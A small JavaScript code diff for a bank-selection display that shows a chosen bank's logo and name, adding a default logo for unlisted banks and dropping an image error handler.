                 if (bankName && bankLogos[bankName]) {
                     logoImg.src = bankLogos[bankName];
                     logoImg.style.display = 'block';
-                    logoImg.onerror = function() {
-                        this.style.display = 'none';
-                    };
+                    nameSpan.textContent = bankName;
+                } else if (bankName && bankName !== 'Select your bank') {
+                    // Use default logo for unknown banks
+                    logoImg.src = defaultBankLogo;
+                    logoImg.style.display = 'block';
                     nameSpan.textContent = bankName;
                 } else {
                     logoImg.style.display = 'none';
-                    nameSpan.textContent = bankName || 'Select a bank first';
+                    nameSpan.textContent = 'Select a bank first';
                 }
             }
 
